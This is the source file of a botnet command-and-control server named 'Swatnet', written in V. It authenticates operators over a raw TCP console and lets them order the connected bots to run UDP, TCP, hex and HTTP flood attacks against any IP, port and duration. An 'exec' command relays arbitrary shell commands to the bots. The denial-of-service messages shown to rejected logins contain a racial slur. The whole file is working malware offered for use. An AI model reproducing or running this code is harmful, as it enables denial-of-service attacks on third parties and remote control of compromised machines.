module cnc

import io
import net
import time
import crypto.sha1

import core.crud
import core.logger
import core.attack

pub struct Swatnet {
	pub mut:
		port		int = 666
		bot_port	int
		bot_pw		string
		c_title		string

		clients 	Clients
		user_crud	crud.User
		bot			Bot_CNC
}

pub struct Clients {
	pub mut:
		name		[]string
		socket		[]net.TcpConn
		ip			[]string
		port		[]string
}

pub fn (mut c Clients) add_client_session(usern string, mut socket net.TcpConn, ip string, port string) {
	c.name << usern
	c.socket << socket
	c.ip << ip
	c.port << port
}

pub fn (mut c Clients) remove_session(mut s net.TcpConn) {
	for i, sock in c.socket {
		if sock == s {
			c.name.delete(i)
			c.socket.delete(i)
			c.ip.delete(i)
			c.port.delete(i)
		}
	}
}

pub fn start_swatnet() Swatnet {
	mut s := Swatnet{clients: &Clients{}, user_crud: &crud.User{}, bot: start_botcnc()}
	return s
}

pub fn start(mut s Swatnet) {
	go s.title_writer()
	s.listener()
}

pub fn (mut s Swatnet) title_writer() { 
	for {
		if (s.clients.name).len > 0 {
			for i, _ in s.clients.name {
				s.clients.socket[i].write_string("\033]0;" + s.c_title + "\007") or { 0 }
			}
		}
		time.sleep(1*time.second)
	}
}

pub fn (mut s Swatnet) listener() {
	mut socket := net.listen_tcp(.ip6, ":${s.port}") or {
		logger.console_log("user_server_failed", "Unable to start Swatnet....!", true)
		exit(0)
	}

	logger.console_log("user_server_up", "Server listening on ${s.port}....", false)
	for {
		mut client := socket.accept() or {
			logger.console_log("user_accept_conn_failed", "Unable to accept client.....!", true)
			return
		}
		client.set_read_timeout(time.infinite)
		go s.auth(mut client)
	}
}

pub fn (mut s Swatnet) auth(mut client net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: client)
	mut crud := crud.User{}
	user_addy := client.peer_addr() or { return }
	user_ip := "${user_addy}".split("]:")[0].replace("[::ffff:", "")

	client.write_string("Username: ") or { 0 }
	client.set_read_timeout(5*time.second) // Set a TIMEOUT
	username := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
	client.write_string("Password: ") or { 0 }
	client.set_read_timeout(5*time.second) // Set a TIMEOUT
	password := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")

	user_info := crud.find(username)
	
	if user_info.username == username && user_info.password == (sha1.sum(password.bytes()).hex()).str() {
		if user_info.ip == user_ip || user_info.ip == "1.1.1.1" {
			client.write_string("[ + ] Access Granted\r\nWelcome: ${username}\r\n") or { 0 }
			client.set_read_timeout(time.infinite)
		} else {
			client.write_string("[ x ] Access Denied (IP)\r\nDuces Nigga....") or { 0 }
			time.sleep(5*time.second)
			client.close() or { return }
			return
		}
	} else {
		client.write_string("[ x ] Access Denied (Password)\r\nDuces Nigga....") or { 0 }
		time.sleep(5*time.second)
		client.close() or { return }
		return
	}
	logger.console_log("user_connected", "User: ${username} successfully connected.....!", false)
	s.clients.add_client_session(username, mut client, user_ip, "${user_addy}".split("]:")[1])
	s.handler(mut client, username)
}

pub fn (mut s Swatnet) handler(mut client net.TcpConn, usern string) {
	mut reader := io.new_buffered_reader(reader: client)
	client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
	for {
		client.write_string("Swatnet@NET~ # ") or { 0 }
		data := (reader.read_line() or { "" }).replace("\r", "").replace("\n", "")
		fcmd, cmd, args := s.bot.parse_buffer(data)
		if data.len > 2 {
			user_info := s.user_crud.find(usern)
			match cmd {
				/* 	All attack commands must move to 
					/core/attack/main.v
				*/
				"home" {
					client.write_string("╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
				}
				"help" {
					client.write_string("home | Dashboard\r\nhelp | List of commands\r\nbots | List Of Bots\r\ncls | Clear Screen\r\nudpplain | udpplain <ip> <port> <time>\r\ntcp | tcp <ip> <port> <time>\r\nstdhex <ip> <port <time>\r\nexec | Reverse Shell [BOTS]\r\n") or { 0 }
				}
				"cls" {
					client.write_string("\033[2J\033[1;1H╔═╗╦ ╦╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n╚═╗║║║╠═╣ ║ ║║║║╣  ║ \r\n╚═╝╚╩╝╩ ╩ ╩ ╝╚╝╚═╝ ╩\r\n") or { 0 }
				}
				"bots" {
					client.write_string("Bots: ${s.bot.nickname.len}\r\n#######################################\r\n") or { 0 }
					for i in 0..(s.bot.ip).len {
						client.write_string("BID: ${i} | Nickname: ${s.bot.nickname[i]} | IP: ${s.bot.ip[i]} | CPU: ${s.bot.cpu[i]}\r\n") or { 0 }
					}
				}
				"udpplain" {
					if args.len < 4 {
						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: udp <ip> <port> <time>\r\n") or { 0 }
					} else {
						bots := s.bot.broadcast_cmd("udpplain ${args[1]} ${args[2]} ${args[3]}")
						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
						mut a := attack.prepare(args, user_info, mut s.bot.socket, attack.AttackType.bots)
						a.send()
					}
				}
				"tcp" {
					if args.len < 4 {
						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: tcp <ip> <port> <time>\r\n") or { 0 }
					} else {
						bots := s.bot.broadcast_cmd("tcp ${args[1]} ${args[2]} ${args[3]}")
						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
					}
				}
				"stdhex" {
					if args.len < 4 {
						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: stdhex <ip> <port> <time>\r\n") or { 0 }
					} else {
						bots := s.bot.broadcast_cmd("stdhex ${args[1]} ${args[2]} ${args[3]}")
						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
					}
				}
				"http" {
					if args.len < 3 {
						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: http <ip> <time>\r\n") or { 0 }
					} else {
						bots := s.bot.broadcast_cmd("http ${args[1]} ${args[2]}")
						client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
					}
				}
				"exec" {
					bots := s.bot.broadcast_cmd("${data}")
					client.write_string("[ + ] Attack successfully sent to ${bots} bots...!\r\n") or { 0 }
				}
				"title" {
					if args.len < 2 {
						client.write_string("[ x ] Error, Invalid arguments provided.\r\nUsage: title <title_msg>\r\n")  or { 0 }
					} else {
						s.c_title = "${fcmd}".replace("${args[0]} ", "")
					}	
				} else { 
					client.write_string("[ x ] Error, No command found....!\r\n") or { 0 }
				}
			}
			logger.console_log("new_user_cmd", fcmd, false)
		}
	}
}